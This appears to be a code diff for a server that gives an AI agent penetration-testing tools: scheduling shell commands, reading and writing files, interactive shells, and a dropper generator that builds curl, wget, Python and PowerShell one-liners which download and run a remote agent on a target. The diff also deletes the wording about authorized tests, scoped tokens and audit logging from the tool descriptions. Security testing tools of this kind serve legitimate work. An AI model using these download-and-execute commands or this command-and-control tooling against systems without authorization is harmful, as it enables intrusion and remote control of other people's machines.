@@ -70,11 +70,11 @@ type AgentTaskInteractInput struct {
 
 // AgentDropperGenerateInput holds parameters for agent_dropper_generate.
 type AgentDropperGenerateInput struct {
-	AgentID  string `json:"agent_id" jsonschema:"Meaningful name for the agent, e.g. 'web-01'"`
-	OsArch   string `json:"os_arch" jsonschema:"Target OS and architecture"`
-	TTL      string `json:"ttl" jsonschema:"Token lifetime in Go duration format, e.g. '2h', '24h', '168h'"`
-	Delivery string `json:"delivery,omitempty" jsonschema:"Delivery mode: 'url' (default) returns curl/wget commands; 'inline' embeds the loader as base64 for air-gapped targets"`
-	Insecure bool   `json:"insecure,omitempty" jsonschema:"Skip TLS certificate verification (loader -k flag). Use ONLY when the target has no CA bundle (e.g. minimal containers)."`
+	AgentID  string `json:"agent_id" jsonschema:"Meaningful identifier for this agent — use the target hostname or role"`
+	OsArch   string `json:"os_arch" jsonschema:"Target platform, e.g. linux/amd64, linux/arm64, windows/amd64"`
+	TTL      string `json:"ttl" jsonschema:"Token lifetime in Go duration format, e.g. '2h', '24h'"`
+	Delivery string `json:"delivery,omitempty" jsonschema:"'url' (default): returns curl/wget commands to fetch the agent. 'inline': embeds the agent as base64 for air-gapped targets"`
+	Insecure bool   `json:"insecure,omitempty" jsonschema:"Skip TLS certificate verification. Use ONLY when the target lacks a CA bundle (e.g. minimal containers)."`
 }
 
 // ── Constants ─────────────────────────────────────────────────────────────────
@@ -91,76 +91,49 @@ const (
 func (s *Server) registerAgentTools() {
 	gomcp.AddTool(s.mcp, &gomcp.Tool{
 		Name: "agent_list",
-		Description: "List agents registered for the current tenant. " +
-			"By default, agents whose token has expired are hidden. " +
-			"Pass show_expired=true to include them. " +
-			"Returns agent_id, status ('online'/'offline'), capabilities, expires_at, and last_seen_at.",
+		Description: "List agents for the current tenant. Returns agent_id, status (online/offline), " +
+			"capabilities, and expiration. Pass show_expired=true to include expired agents.",
 	}, s.handleAgentList)
 
 	gomcp.AddTool(s.mcp, &gomcp.Tool{
 		Name: "agent_task_schedule",
-		Description: "Schedule a task on a registered agent during an authorized penetration test. " +
-			"Tasks are async — poll agent_task_status until status is 'done' or 'error'.\n\n" +
-			"Available capabilities and their params:\n" +
-			"  exec             — run a shell command. params: {\"cmd\": \"<shell command>\"}\n" +
-			"  interactive_exec — start an interactive process (PTY on Unix). params: {\"command\": \"<shell command>\", \"binary\": false}\n" +
-			"                     Use agent_task_interact to send stdin and read stdout/stderr.\n" +
-			"  read_file        — read a file and return base64-encoded content. params: {\"path\": \"<absolute path>\"}\n" +
-			"  write_file       — write a file from base64-encoded content. params: {\"path\": \"<absolute path>\", \"content_b64\": \"<base64 data>\", \"mode\": \"0644\"}\n" +
-			"  fetch_url        — make an HTTP GET request. params: {\"url\": \"<url>\"}\n" +
-			"  system_info      — return hostname, OS, arch, current user. params: {} (none required)\n\n" +
-			"The timeout_secs parameter controls the overall task deadline (default 600 s = 10 min). " +
-			"The agent enforces this deadline locally, killing any subprocess when it fires. " +
-			"Use agent_task_cancel to abort a pending or running task early.\n\n" +
-			"The returned task_id is used to poll agent_task_status for the result.",
+		Description: "Schedule a task on an online agent. Tasks run asynchronously — use agent_task_status to get results.\n\n" +
+			"Capabilities and params:\n" +
+			"  exec             — {\"cmd\": \"<shell command>\"}\n" +
+			"  interactive_exec — {\"command\": \"<shell command>\"} — use agent_task_interact for I/O\n" +
+			"  read_file        — {\"path\": \"<absolute path>\"} — returns base64 content\n" +
+			"  write_file       — {\"path\": \"<path>\", \"content_b64\": \"<base64>\", \"mode\": \"0644\"}\n" +
+			"  fetch_url        — {\"url\": \"<url>\"}\n" +
+			"  system_info      — {} — returns hostname, OS, arch, user\n\n" +
+			"timeout_secs sets the task deadline (default 600s). Use agent_task_cancel to abort early.",
 	}, s.handleAgentTaskSchedule)
 
 	gomcp.AddTool(s.mcp, &gomcp.Tool{
 		Name: "agent_task_status",
-		Description: "Get the status and result of a scheduled agent task. " +
-			"Status progresses: pending → running → done | error.\n\n" +
-			"By default (wait=true), this tool blocks server-side until the task reaches a terminal state " +
-			"('done' or 'error') or the wait timeout elapses — no polling needed. " +
-			"The response includes timed_out=true if the wait timeout fired before the task completed. " +
-			"If the task is already in a terminal state, the tool returns immediately regardless of wait.\n\n" +
-			"Set wait=false to get the current status instantly without blocking. " +
-			"Use wait=false when you need to check multiple tasks in parallel, when you want to show " +
-			"intermediate progress to the user, or when you have other work to do between checks.\n\n" +
-			"timeout_secs controls how long this tool call blocks (default 30, max 120). " +
-			"This is the *wait timeout* — it only affects how long this status query blocks. " +
-			"It is independent of the *task timeout* set in agent_task_schedule, which controls " +
-			"how long the agent has to finish the task overall.\n\n" +
-			"On success, 'result' contains the capability output (e.g. exec: {output, exit_code}; " +
-			"read_file: {content, path} base64-encoded; fetch_url: {status, body} base64-encoded). " +
-			"On error, 'error' contains the error message.",
+		Description: "Get the result of a scheduled task. Status: pending → running → done | error.\n\n" +
+			"By default (wait=true), blocks until the task completes or timeout_secs elapses (default 30, max 120). " +
+			"Set wait=false to return immediately.\n\n" +
+			"On success, 'result' contains capability output (exec: {output, exit_code}; " +
+			"read_file: {content} base64; fetch_url: {status, body} base64). " +
+			"On error, 'error' has the message.",
 	}, s.handleAgentTaskStatus)
 
 	gomcp.AddTool(s.mcp, &gomcp.Tool{
 		Name: "agent_task_cancel",
-		Description: "Cancel a pending or running agent task. " +
-			"Transitions the task to status 'error' with error 'cancelled'. " +
-			"If the agent is currently connected, a cancel signal is forwarded immediately so the agent can kill the running subprocess. " +
-			"Returns an error if the task does not exist or is already in a terminal state (done/error).",
+		Description: "Cancel a pending or running task. The agent kills any subprocess immediately. " +
+			"Fails if the task is already in a terminal state.",
 	}, s.handleAgentTaskCancel)
 
 	gomcp.AddTool(s.mcp, &gomcp.Tool{
 		Name: "agent_task_interact",
-		Description: "Send input to and read output from a running interactive_exec task.\n\n" +
-			"When an interactive_exec task is scheduled, the agent starts the process under a PTY " +
-			"(Unix) or pipes (Windows). Use this tool to exchange data with the running process.\n\n" +
+		Description: "Send input to and read output from an interactive_exec task.\n\n" +
 			"Workflow:\n" +
-			"  1. Schedule: agent_task_schedule(capability=\"interactive_exec\", params={\"command\": \"...\"})\n" +
-			"  2. Read initial output: agent_task_interact(task_id=...) — no stdin, just drain startup output\n" +
-			"  3. Send input + read response: agent_task_interact(task_id=..., stdin=\"yes\\n\")\n" +
-			"  4. Repeat until the process exits (running=false in the response)\n\n" +
-			"C-style escape sequences in stdin are interpreted before sending:\n" +
-			"  \\n = newline, \\r = carriage return, \\t = tab, \\\\ = literal backslash,\n" +
-			"  \\xNN = hex byte (e.g. \\x03 = Ctrl-C, \\x04 = Ctrl-D, \\x1b = Escape).\n" +
-			"By default, stdout/stderr are returned as UTF-8 text. Set binary=true to use " +
-			"base64 encoding for both directions (e.g. when the process emits raw binary).\n\n" +
-			"If wait=true (default) and no output is available yet, the call blocks server-side " +
-			"until output arrives or timeout_secs elapses — no polling loop needed.\n\n" +
-			"Returns {stdout, stderr, running, exit_code}. exit_code is present only when running=false.",
+			"  1. Schedule with capability=\"interactive_exec\"\n" +
+			"  2. Call agent_task_interact(task_id=...) to read initial output\n" +
+			"  3. Send input: agent_task_interact(task_id=..., stdin=\"command\\n\")\n" +
+			"  4. Repeat until running=false (exit_code is then present)\n\n" +
+			"Stdin supports C-style escapes: \\n, \\t, \\x03 (Ctrl-C), \\x04 (Ctrl-D). " +
+			"Set binary=true for base64 I/O. Blocks by default until output arrives or timeout_secs elapses.",
 	}, s.handleAgentTaskInteract)
 
 	targets := scanLoaderTargets(s.binDir)
@@ -169,36 +142,21 @@ func (s *Server) registerAgentTools() {
 		targetList = "(none — run 'make build-loaders' on the server)"
 	}
 	dropperDesc := fmt.Sprintf(
-		"Mint an agent token and generate delivery commands for a two-stage agent. "+
-			"Used during authorized penetration tests to establish a managed agent on a target "+
-			"where the operator has confirmed access. All tokens are scoped, time-limited, "+
-			"and recorded in the audit log.\n\n"+
-			"Stage 1 (loader) is tiny (~77KB for Linux, ~1.8MB for Windows) — deliver via URL or inline base64.\n"+
-			"Stage 1 daemonizes immediately (the dropper command returns right away) and then downloads "+
-			"Stage 2 (the full agent) over authenticated HTTPS in the background before exec-ing it.\n\n"+
-			"IMPORTANT: because the loader daemonizes, the dropper command exits before the agent is online. "+
-			"The agent typically appears within a few seconds, but it may take longer on slow connections. "+
-			"After running the dropper, wait a moment and then poll agent_list until the agent shows 'online'.\n\n"+
-			"Delivery modes (choose based on target environment):\n"+
-			"  url    — target fetches loader over HTTPS. Returns curl_cmd, wget_cmd, python3_cmd in fallback order.\n"+
-			"  inline — loader embedded as base64; no outbound HTTP needed. Returns b64_cmd and python3_b64_cmd fallback.\n\n"+
-			"IMPORTANT — not all tools are installed on every target. Try commands in order until one succeeds:\n"+
-			"  Linux url:    curl_cmd → wget_cmd → python3_cmd\n"+
-			"  Linux inline: b64_cmd  → python3_b64_cmd\n"+
-			"  Windows url:  curl_cmd (curl.exe is built-in since Win10 1803)\n"+
-			"  Windows inline: b64_cmd (pure PowerShell, no external tools needed)\n"+
-			"If a command fails with 'command not found' / 'not recognized', move to the next fallback immediately.\n\n"+
-			"Loader flags (set via insecure parameter or added manually to the command):\n"+
-			"  -k  Skip TLS certificate verification. Use ONLY when the target lacks a CA bundle (e.g. minimal containers).\n"+
-			"      The flag is propagated to the Stage 2 agent so its WebSocket also skips verification.\n"+
-			"  -f  Stay in foreground (do not daemonize). Useful for debugging — errors are printed to stderr.\n\n"+
-			"Workflow after achieving code execution on an authorized target:\n"+
-			"  1. Probe target OS/arch: uname -m (Linux) or $ENV:PROCESSOR_ARCHITECTURE (Windows).\n"+
-			"  2. Call agent_dropper_generate with agent_id, os_arch, ttl, and delivery mode.\n"+
-			"  3. Try each command in the fallback chain until one succeeds (the command returns immediately).\n"+
-			"  4. Wait a few seconds, then call agent_list to confirm the agent appears as 'online'.\n"+
-			"     If the agent does not appear, retry with -f added to the loader command to see errors.\n"+
-			"  5. Use agent_task_schedule to run capabilities (exec, read_file, fetch_url, system_info).\n\n"+
+		"Generate a one-liner command to deploy an agent on a target where you have code execution. "+
+			"Returns ready-to-run shell commands with multiple fallbacks.\n\n"+
+			"The command runs in the background and returns immediately. "+
+			"The agent typically comes online within a few seconds — poll agent_list to confirm.\n\n"+
+			"Delivery modes:\n"+
+			"  url    — fetches the agent over HTTPS (default). Returns curl_cmd, wget_cmd, python3_cmd.\n"+
+			"  inline — agent embedded as base64, no outbound HTTP needed. Returns b64_cmd, python3_b64_cmd.\n\n"+
+			"Try the returned commands in order until one succeeds. "+
+			"If none work, add -f to the command to stay in foreground and see errors.\n\n"+
+			"Workflow:\n"+
+			"  1. Determine target OS/arch (e.g. uname -m).\n"+
+			"  2. Call this tool with a descriptive agent_id, the os_arch, and a ttl.\n"+
+			"  3. Run the first available command on the target.\n"+
+			"  4. Poll agent_list until the agent shows online.\n"+
+			"  5. Use agent_task_schedule to run tasks on the agent.\n\n"+
 			"Available targets: %s", targetList)
 
 	gomcp.AddTool(s.mcp, &gomcp.Tool{
@@ -798,8 +756,10 @@ func parseDropperParams(agentID, osArch, ttlStr, delivery string) (time.Duration
 
 // loaderNameForArch returns the loader binary filename for the given os/arch pair.
 func loaderNameForArch(osArch string) string {
-	name := "loader-" + osArch
-	if strings.HasPrefix(osArch, "windows-") {
+	// os_arch uses slash separator (e.g. "linux/amd64") but filenames use dashes.
+	normalized := strings.ReplaceAll(osArch, "/", "-")
+	name := "loader-" + normalized
+	if strings.HasPrefix(normalized, "windows-") {
 		name += ".exe"
 	}
 	return name
@@ -826,7 +786,7 @@ func buildDropperCmds(osArch, downloadURL, loaderB64, launchArgs string, insecur
 		py3TLS = "import ssl; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; "
 	}
 
-	if strings.HasPrefix(osArch, "windows-") {
+	if strings.HasPrefix(osArch, "windows/") || strings.HasPrefix(osArch, "windows-") {
 		return dropperCmds{
 			curlCmd: fmt.Sprintf(
 				`curl.exe %s "%s" -o "$env:TEMP\l.exe" && & "$env:TEMP\l.exe" %s`,
